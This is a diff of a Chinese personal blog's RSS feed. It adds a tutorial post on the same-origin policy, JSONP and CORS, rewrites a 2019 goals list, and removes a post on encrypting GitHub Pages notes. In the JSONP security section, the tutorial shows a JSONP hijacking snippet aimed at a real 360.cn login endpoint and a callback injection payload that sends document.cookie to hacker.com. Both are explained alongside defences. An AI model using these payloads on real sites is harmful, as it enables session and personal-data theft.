@@ -5,9 +5,142 @@
     <description>赖晨东的博客 | 咖啡不苦</description>
     <link>http://laichendong.com/</link>
     <atom:link href="http://laichendong.com/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Thu, 09 Jan 2020 09:58:30 +0800</pubDate>
-    <lastBuildDate>Thu, 09 Jan 2020 09:58:30 +0800</lastBuildDate>
+    <pubDate>Tue, 09 Jun 2020 11:37:26 +0800</pubDate>
+    <lastBuildDate>Tue, 09 Jun 2020 11:37:26 +0800</lastBuildDate>
     <generator>Jekyll v3.8.5</generator>
+    
+      <item>
+        <title></title>
+        <description>&lt;p&gt;前几天面试一小哥哥，说到跨域问题，说的语焉不详的。所以将相关知识点整理了一下，成文如下：&lt;/p&gt;
+
+&lt;h2 id=&quot;什么是跨域问题&quot;&gt;什么是跨域问题&lt;/h2&gt;
+
+&lt;p&gt;通常大家所说的跨域问题，就是脚本要访问一个别的域名的数据时，发现被浏览器阻止了，访问不了，然后想各种办法去实现这个跨域名的数据读取，就被笼统的称作&lt;strong&gt;跨域问题&lt;/strong&gt;；但其实，跨域问题不是&lt;strong&gt;跨域&lt;/strong&gt;，而是&lt;strong&gt;跨源（cross-origin）&lt;/strong&gt;问题。现代浏览器里有一个叫做&lt;strong&gt;同源策略&lt;/strong&gt;的机制，正是这个机制阻止了资源的跨域访问。那么什么是同源策略，以及为什么要有这个策略呢？&lt;/p&gt;
+
+&lt;h2 id=&quot;同源策略same-origin-policy&quot;&gt;同源策略（Same Origin Policy）&lt;/h2&gt;
+
+&lt;p&gt;简单的说，同源策略是浏览器的一种&lt;strong&gt;安全机制&lt;/strong&gt;。他规定&lt;strong&gt;从某一个源（服务端）加载（到浏览器端）的页面（脚本）只能&lt;em&gt;访问（向xxx发请求）&lt;/em&gt;与他“&lt;em&gt;同源&lt;/em&gt;”的页面的&lt;em&gt;资源&lt;/em&gt;&lt;/strong&gt;。那“同源”里的&lt;strong&gt;源&lt;/strong&gt;又是什么意思呢？&lt;strong&gt;同源是指两个URL里的：协议（protocol），端口（port），域名（hosts）完全相同&lt;/strong&gt;，也就是URL的Scheme一致。例如：&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://abc.com  和 https://abc.com 不同源，协议不同
+http://abc.com 和 http://abc.com:8080 不同源，端口不同
+http://a.abc.com 和 http://b.abc.com 也不同源，域名不同
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;也就是说，上面这些页面之间都不能发送请求。你可能会感到奇怪，“我的网页的静态资源都放在cdn域名里，比如公共js，然后加载到页面执行，一点问题都没有啊”，这是不是违法了同源策略？嗯，所以同源策略里规定的“&lt;strong&gt;访问&lt;/strong&gt;”是一个相对模糊的概念。一般来说：&lt;strong&gt;内嵌一个跨源的资源是被允许的，但是读取一个跨源的资源是不允许的。&lt;/strong&gt;比如，你可以用&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;iframe src=''/&amp;gt;&lt;/code&gt;嵌入一个跨源的页面（当然，被嵌入的页面的服务器端可以设置&lt;code class=&quot;highlighter-rouge&quot;&gt;X-Frame-Options&lt;/code&gt;响应头来控制自己允不允许被iframe嵌入，可以在一定程度上防止黑客制作钓鱼网站），但不能用js获得这个被嵌入的页面里的dom对象引用。&lt;/p&gt;
+
+&lt;p&gt;更具体的来说，下面列出来哪些动作被允许，哪些动作不被允许。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1、**iframe**，  一般来说，用src跨源嵌入是可以的，但不让读取里面的内容
+
+2、**css**，可以用link标签和@import来嵌入，但是要正确的设置Content-Type
+
+3、**表单**，表单可以通过action属性提交到一个跨源的目的地页面，也就是说，跨源写是允许的
+
+4、**图片**，图片可以用img标签嵌入，但是如果从一个跨源的地方读一张图片然后画到canvas上，则不允许（这相当于读了图片的内容）
+
+5、**多媒体内容**，同理，视频和音频这些内容是可以通过video和audio标签内嵌到页面上来的。
+
+6、**脚本**，脚本当然可以用script标签嵌入，但不能访问一些特定的api，比如通过XMLHttpRequest或Fetch发送跨域资源请求。
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;为什么要有同源策略&quot;&gt;为什么要有同源策略？&lt;/h2&gt;
+
+&lt;p&gt;总而言之，是搞了很多的限制。那为什么要搞这么多的限制呢，怪麻烦的。刚提到，同源策略是一个重要的安全策略。也就是说，是浏览器为了web安全而不得不搞出来的一种限制。想象一下，如果没有这个限制。一个源attacker.com的脚本可以读取xxx.bank.com页面的信息和往xxx.bank.com发请求的话。attacher就可以用脚本读取你在bank.com里的账号和密码，发起转账，等等都可以了。所以，同源策略，保护的是被跨源访问的域。这点是很多人没有彻底理解跨域问题的根源。&lt;/p&gt;
+
+&lt;h2 id=&quot;但实际就有跨源资源访问的需求怎么办&quot;&gt;但实际就有跨源资源访问的需求怎么办？&lt;/h2&gt;
+
+&lt;p&gt;同源策略安全是安全，但他是一刀切的方案，实际情况是真的有很多时候需要跨源访问资源：现代网站很多用域名做了垂直拆分，甚至很多本来就是公共服务，就希望被所有人访问到，比如天气预报数据等等，都被这个同源策略所阻止了。在之前，比较著名和流行的方式就是采用&lt;strong&gt;JSONP&lt;/strong&gt;技术来实现跨源访问。&lt;/p&gt;
+
+&lt;h2 id=&quot;jsonpjson-with-padding技术&quot;&gt;JSONP（JSON with padding）技术&lt;/h2&gt;
+
+&lt;p&gt;这是一种被普遍使用的，绕过浏览器同源策略的数据共享方法。他的基本思想是，在网页里插入一个&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script /&amp;gt;&lt;/code&gt;元素，用script标签的src属性加载一个跨源脚本（这是被允许的），这个脚本的服务端，将要共享的数据以JSON的格式放到一个指定名字的回调函数的入参里（with padding）传回来。页面的回调函数实现就拿到跨源的共享数据了。&lt;/p&gt;
+
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/**
+* 工具函数，往页面里插入一个指定src的script标签，以发起请求
+* 其实也可以发起ajax请，很多三方库（比如jQuery）都有封装
+*/&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addScriptTag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'script'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;// 调用工具函数，发起请求，并告诉服务端，回调函数名字叫foo&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;addScriptTag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'http://example.com/ip?callback=foo'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;// 服务端返回JSON格式的数据，并 放在一个叫 foo的函数调用的入参里，如下：&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;// foo({&quot;ip&quot;: &quot;8.8.8.8&quot;});&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;cm&quot;&gt;/**
+* 回调函数，服务端返回的内容，会回调这个函数，并且把数据作为参数传入，这样就实现了跨源数据共享的目的
+*/&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Your public IP address is: '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;从原理上来看，JSONP其实是一种Hacking技术，用一种巧妙的方式绕开了同源策略的限制，虽然能实现跨源访问的目的，但其实也会带来一些安全问题。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;1、CSRF（ Cross-site request forgery 跨站请求伪造）攻击&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;如果通过JSONP获取的数据是敏感数据（比如用户登录之后才能读取到的数据），攻击者可以构造一个这样的请求，藏在某个页面里，如果用户在登录的情况下访问了那个页面（攻击者可以引诱被攻击者访问），就会在不知情的情况下将自己的数据泄露。比如&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;wooyun&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  	&lt;span class=&quot;c1&quot;&gt;// 这里可以干坏事，比如将用户的用户名，邮箱等发送到指定的地址， &lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// 把这坨代码放注入到360的某个子域的页面里，就等着有人上钩了&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://js.login.360.cn/?o=sso&amp;amp;m=info&amp;amp;func=wooyun&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;也就是说，攻击者在被攻击者不知情的情况下向某个JSONP的服务端发送了请求（如果这个请求是转账？^_^）。所以要防止这种攻击，服务端除了要验证用户的登录状态，还要验证请求的Refer，增加token校验等等。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;2、callback函数名可自定义，导致注入风险&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;因为，callback参数值会作为函数名传个服务器并传回来，在浏览器端执行，如果这个参数不是一个正常的函数名，而是一个表达式，甚至是一段脚本呢？就会有问题了。比如&lt;/p&gt;
+
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/pay?callback=&amp;lt;srcript&amp;gt;$.get(&quot;http://hacker.com?cookie=&quot;+document.cookie)&amp;lt;/script&amp;gt;'&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;攻击者还可以构造一些更加精巧的callback内容，实现RFD攻击。&lt;/p&gt;
+
+&lt;p&gt;要防止这种攻击，第一步要做的就是对callback参数的内容做转义，第二是要对返回的内容设置&lt;code class=&quot;highlighter-rouge&quot;&gt;conten-type=application/json&lt;/code&gt; （不能被执行）而不是&lt;code class=&quot;highlighter-rouge&quot;&gt;application/javascript&lt;/code&gt;。&lt;/p&gt;
+
+&lt;p&gt;想要更安全优雅的实现跨源资源共享该怎么办呢？其实早在2014年的时候w3c就通过了&lt;strong&gt;跨源资源共享（Cross-Origin Resource Sharing (CORS)）&lt;/strong&gt; 的标准。&lt;/p&gt;
+
+&lt;h2 id=&quot;corscross-origin-resource-sharing跨源资源共享-技术&quot;&gt;CORS（Cross-Origin Resource Sharing）跨源资源共享 技术&lt;/h2&gt;
+
+&lt;p&gt;上文说到，&lt;strong&gt;浏览器是为了保护被跨源访问的服务不被别人随意访问才不得不设置了同源策略，并且这种一刀切的方式带来了许多不便。那如果某个源的服务器明确告诉浏览器说，我这个服务是允许别人来访问的，你不用使用同源策略来禁止别人访问我，那不就没问题了&lt;/strong&gt;。这就是cors机制的基本原理。&lt;/p&gt;
+
+&lt;p&gt;最基本的实现CORS和把大象装冰箱一样，总共分三步：&lt;/p&gt;
+
+&lt;p&gt;1、浏览器发现是一个跨源请求，就在请求头上加一个字段&lt;code class=&quot;highlighter-rouge&quot;&gt;Origin&lt;/code&gt;；包括协议，域名，端口。告诉被请求的服务端说，我是谁。&lt;/p&gt;
+
+&lt;p&gt;2、服务器收到请求，应该检查这个Origin是不是被允许的访问来源，如果是被允许的，则在响应头上加上&lt;code class=&quot;highlighter-rouge&quot;&gt;Access-Control-Allow-Origin&lt;/code&gt;，这个值可以是一个具体的origin，也可是是&lt;code class=&quot;highlighter-rouge&quot;&gt;*&lt;/code&gt;表示允许所有源访问。&lt;/p&gt;
+
+&lt;p&gt;3、浏览器收到服务器的响应，检查是否有&lt;code class=&quot;highlighter-rouge&quot;&gt;Access-Control-Allow-Origin&lt;/code&gt;头，如果有，才能把具体的响应体返回给请求发送者，否则报错，告诉请求发起方&lt;code class=&quot;highlighter-rouge&quot;&gt;access blocked by CORS policy&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;其实，我们发现，CORS虽然阻止了将响应返回个请求发送者，但实际上请求是有真的发送到服务端的！所以当我们在做服务端接口的时候，一定要注意先要检查请求的Origin，再决定是否做相应的动作。以免形成事实上的攻击。这个在nginx配置上一定要注意，不能无脑的反射Origin。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;复杂请求的先导请求&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;我觉得也是出于这个原因，CORS把请求分成普通请求和复杂请求（complex request），对于复杂请求（万一请求对服务端有伤害的请求？）先用一个先导请求（preflight request）去问下服务端是否接受这类请求，得到确认后再发送具体请求。先导请求是浏览器自动发送的，并且服务端可以设置缓存建议。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;用cors发送cookie？&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;除了Allow Origin这种源的白名单机制，cors还可以通过cookie实现对用户的身份认证，在请求头上加上 &lt;code class=&quot;highlighter-rouge&quot;&gt;credentials: 'include'&lt;/code&gt; 可以让请求带上cookie发送， 为了安全考虑，cors规定如果用了，则&lt;code class=&quot;highlighter-rouge&quot;&gt;Access-Control-Allow-Origin&lt;/code&gt;必须指定具体的值，不能为&lt;code class=&quot;highlighter-rouge&quot;&gt;*&lt;/code&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Tue, 09 Jun 2020 11:37:26 +0800</pubDate>
+        <link>http://laichendong.com/2020/06/09/2020-06-09-cross_domain/</link>
+        <guid isPermaLink="true">http://laichendong.com/2020/06/09/2020-06-09-cross_domain/</guid>
+        
+        
+      </item>
     
       <item>
         <title>mathematics</title>
@@ -89,15 +222,33 @@
     
       <item>
         <title>2019-flags</title>
-        <description>&lt;p&gt;跑步：700/1000/1200   完成一次全马&lt;/p&gt;
+        <description>&lt;h3 id=&quot;自我成长&quot;&gt;自我成长：&lt;/h3&gt;
 
-&lt;p&gt;游泳：学会踩水  2min以上&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- 报考清华经管MBA
+- 把自己变成AI人才，多写点代码？
+- 看书：月均1本
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;画画：系统的学学素描，打型，多画&lt;/p&gt;
+&lt;h3 id=&quot;提升生活情趣&quot;&gt;提升生活情趣：&lt;/h3&gt;
 
-&lt;p&gt;小孩教育：小天小学， 小月幼儿园&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- 品味：保持工位，家里的干净整洁和美感
+- 画画：系统的学学素描，打型，多画
+- 摄影：多拍
+- 跑步：700/1000/1200   完成一次全马
+- 游泳：学会踩水  2min以上
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;自我成长：报考清华MBA，多写点代码？把自己变成AI人才&lt;/p&gt;
+&lt;h3 id=&quot;责任&quot;&gt;责任：&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- 小孩教育：小天小学， 小月幼儿园
+- 多陪家人
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;想给自己的礼物&quot;&gt;想给自己的礼物：&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- apple  Watch ： 4k
+- 适马 24-70 2.8   8k
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 </description>
         <pubDate>Fri, 29 Nov 2019 00:00:00 +0800</pubDate>
@@ -478,42 +629,6 @@ chart.setOption(option);
         
         
         <category>Reading</category>
-        
-      </item>
-    
-      <item>
-        <title>怎么用gitpages还能藏住秘密</title>
-        <description>&lt;p&gt;我们用gitpages写博客，但假设，你想把他当做笔记来使用，有些内容并不希望公开，别人看不了，只有你能看，该怎么办呢？&lt;/p&gt;
-
-&lt;p&gt;最直接的，我们想到，需要输入一个密码，才可以看到相应的内容。但整个gitpages是全静态的。你的密码以及验证程序不可避免的明文下载到浏览器端。即使做一个js代码混淆，基本上还是掩耳盗铃。&lt;/p&gt;
-
-&lt;p&gt;某天偶然发现一个叫static crypt的东西，他号称能用密码保护一个html。 &lt;a href=&quot;https://robinmoisson.github.io/staticrypt/&quot;&gt;https://robinmoisson.github.io/staticrypt/&lt;/a&gt; , 他基于&lt;a href=&quot;https://github.com/brix/crypto-js&quot;&gt;https://github.com/brix/crypto-js&lt;/a&gt; ，用 AES-256加密你的html文件，然后把加密过的内容发送到浏览器端，浏览器看到的是一个密码输入框，输入密码，解密，把解密后的html显示出来。大功告成！这个东西还提供命令行版本和npm模块支持。这就方便了我们和gitpages以及jekyll结合。&lt;/p&gt;
-
-&lt;p&gt;首先，确定什么东西是秘密的，不想让人看见，不能push到github的。&lt;/p&gt;
-
-&lt;h4 id=&quot;笔记原文&quot;&gt;&lt;strong&gt;笔记原文&lt;/strong&gt;&lt;/h4&gt;
-
-&lt;p&gt;正常情况下，文章已md格式放在_posts 或 _drafts 下。但是我们的笔记，应该不能用原文md push到github上。不然人家直接去github看就好了。为了方便起见，我们在 _posts 文件夹下建一个s文件夹。方便加入 .gitignore 和脚本操作&lt;/p&gt;
-
-&lt;h4 id=&quot;秘钥&quot;&gt;秘钥&lt;/h4&gt;
-
-&lt;p&gt;AES是对称加密方法。秘钥，也是我们在浏览器上看笔记时要输入密码，所以这个东西不能push上去简直是废话。&lt;/p&gt;
-
-&lt;p&gt;那如何做到不把这些东西放上去，我们还能在浏览器上看到我们的笔记呢？&lt;/p&gt;
-
-&lt;p&gt;1、首先，我们在网站的更目录里新建一个叫s的文件夹。方便我们找到所有加密过的笔记。&lt;/p&gt;
-
-&lt;p&gt;2、写一个脚本 crypt_posts.sh ; 首先这个脚本调用jekyll  bilud。将我们的笔记md源文件编译成带样式的html；然后对这些html挨个调用staticrypt对其加密(秘钥也在这个文件里制定)；再然后将加密生成的文件替换掉原来编译出来的带明文信息的文件。最后，在这个过程中，可生成一个index.html。 方便在访问${domain}/s 时提供加密文件的索引。当然，这个文件必须加入 .gitignore列表&lt;/p&gt;
-
-&lt;p&gt;3、额，没有第三步，好尴尬~&lt;/p&gt;
-
-</description>
-        <pubDate>Mon, 15 Apr 2019 00:00:00 +0800</pubDate>
-        <link>http://laichendong.com/2019/04/15/password-protect-a-static-html-page/</link>
-        <guid isPermaLink="true">http://laichendong.com/2019/04/15/password-protect-a-static-html-page/</guid>
-        
-        <category>前端加密</category>
-        
         
       </item>
     
